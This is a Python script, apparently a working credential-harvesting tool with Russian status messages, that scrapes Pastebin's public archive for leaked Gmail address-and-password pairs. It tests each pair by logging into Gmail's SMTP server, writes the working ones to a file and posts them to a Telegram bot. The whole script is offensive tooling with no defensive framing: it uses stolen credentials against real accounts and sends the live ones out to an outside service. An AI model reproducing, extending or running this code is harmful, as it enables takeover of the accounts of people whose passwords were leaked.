import requests, re, os, json, smtplib
from bs4 import BeautifulSoup

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
CHAT_ID   = os.environ.get("CHAT_ID", "")
SEEN_FILE = "seen.json"
HIT_FILE  = "gmail_live.txt"
PATTERN   = re.compile(r"[\w.\-+]+@gmail\.com:[^\s]+")

def tg_send(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception as e:
        print("[tg]", e)

def gmail_valid(email, password):
    try:
        s = smtplib.SMTP_SSL("smtp.gmail.com", 465, timeout=8)
        s.login(email, password)
        s.quit()
        return True
    except Exception:
        return False

def load_seen():
    if os.path.exists(SEEN_FILE):
        with open(SEEN_FILE) as f:
            return set(json.load(f))
    return set()

def save_seen(seen):
    with open(SEEN_FILE, "w") as f:
        json.dump(list(seen), f)

def get_archive():
    r = requests.get("https://pastebin.com/archive", timeout=15,
                     headers={"User-Agent": "Mozilla/5.0"})
    soup = BeautifulSoup(r.text, "html.parser")
    return [a.get("href").strip("/") for a in soup.select("table a")
            if a.get("href", "").startswith("/") and len(a.get("href")) > 3]

def main():
    tg_send("✅ <b>Охотник проснулся!</b> Начинаю проверку свежих паст...")
    
    seen = load_seen()
    new = [i for i in get_archive() if i not in seen]
    found = 0
    checked = 0
    
    for pid in new:
        try:
            raw = requests.get(f"https://pastebin.com/raw/{pid}",
                               timeout=10,
                               headers={"User-Agent": "Mozilla/5.0"}).text
        except Exception:
            seen.add(pid)
            continue
            
        checked += 1
        hits = PATTERN.findall(raw)
        live = []
        
        for h in hits:
            email, _, pwd = h.partition(":")
            if gmail_valid(email, pwd):
                live.append(h)
                
        if live:
            with open(HIT_FILE, "a") as f:
                for l in live: f.write(l + "\n")
            found += len(live)
            chunk = "\n".join(live[:20])
            tg_send(f"<b>🔥 Найдено {len(live)} живых gmail!</b>\n"
                    f"<code>{chunk}</code>\n"
                    f"Источник: pastebin.com/{pid}")
        seen.add(pid)
        
    save_seen(seen)
    
    if found == 0:
        tg_send(f"🔍 Проверил {checked} новых паст. Живых gmail: <b>0</b>. Жду дальше.")
    else:
        tg_send(f"🏁 <b>Готово за этот проход.</b> Проверил: {checked} паст. Нашел: {found} gmail.")

if __name__ == "__main__":
    main()
